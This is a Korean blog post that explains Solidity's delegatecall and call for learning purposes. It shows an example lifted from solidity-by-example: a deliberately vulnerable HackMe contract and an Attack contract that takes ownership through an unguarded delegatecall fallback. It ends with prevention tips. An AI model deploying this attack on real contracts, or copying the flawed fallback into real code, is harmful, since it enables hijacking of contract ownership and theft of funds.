---
emoji: 🧢
title: (취약점 시리즈 4) Delegate Call
date: '2021-12-26 22:34:00'
author: 한성원
tags: DelegateCall 취약점 SmartContract
categories: 취약점분석
---

# 👋 DelegateCall

## 들어가기전 Call 과 Delegate Call의 차이점
#### Call이란?
Call은 다른 contract와 상호작용하기 위한 low level function이다.

컨트랙트 A를 통해 컨트랙트 B의 함수 호출시 B의 Storage를 변경시키며 msg.sender(호출자)는 컨트랙트A의 주소가 됩니다.

#### Delegate Call이란?
delegate call은 call과 매우 유사하다. delegate은 '위임하다' 라는 뜻으로 call에 대한 권한을 위임한다고 볼 수 있다. 

Delegate Call에는 2가지 특징이 있다.
1. 호출한 contract의 context를 기반으로 동작된다.
2. storage layout은 delegatecall을 이용하는 contract와 같아야한다.

예를 들어 컨트랙트 A를 통해 컨트랙트 B 호출시 B의 Storage를 변경시키지 않고, B의 코드를 A에서 실행합니다. msg.sender와 msg.value가 컨트랙트 A 호출시와 같고, 변동되지 않습니다.

만약 delegate call에 대해 방지하지 않는다면 contract의 내용을 hacker가 마음대로 조종 할 수 있게 될수도 있다. EX) owner변경, ether 가로채기 등등

- - -

## Example Code 1
```solidity
contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
```
<span style="color:grey">출처: https://solidity-by-example.org/hacks/delegatecall/ </span> 

시나리오는 이렇다.
1. A가 Lib contract 배포
2. A가 Lib의 address를 포함한 HackMe contract 배포
3. __Hacker__ 가 HackMe의 address를 포함한 Attack contract 배포
4. __Hacker__ 가 Attack.attack()을 call
5. HackMe contract의 owner는 Attack contract가 된다.

좀 더 자세히 들여다보겠다. 
__Hacker__ 가 Attack.attack를 call하게 되면 HackMe contract의 fallback function이 실행된다. Fallback function에는 lib를 쓰기 위한 Delegate Call이 존재한다. Attack.attack에서 "pwn()"을 보냈기 때문에 Lib contract의 pwn이 실행된다. 
이때 delegate call로 call하였기 때문에 msg.sender은 Attack contract가 된다. 이렇게되면 Attack contract가 HackMe의 주인이 된다.

- - -

## How to prevent?
1. __library__ 키워드를 사용한다. 
    library 키워드를 사용함으로써 stateless하고 self destruct를 방지 할 수 있다.
2. 가능하다면 stateless 라이브러리를 사용한다.
    위와 마찬가지로 stateless하다면 바꿀 state가 없기 때문에 더 안전해질 수 있다.

- - -

## 마무리
나에게 Delegate call은 생각보다 개념이 어려웠다. Example code와 다른 example들을 통해 실습하면서 개념을 얻을 것 같다. 한편으로 이게 어려우면 다른건 어째하냐~~ 라는 생각이들지만 그때마다 실습하지 뭐!! 실습 짱!!


- - -


```toc

```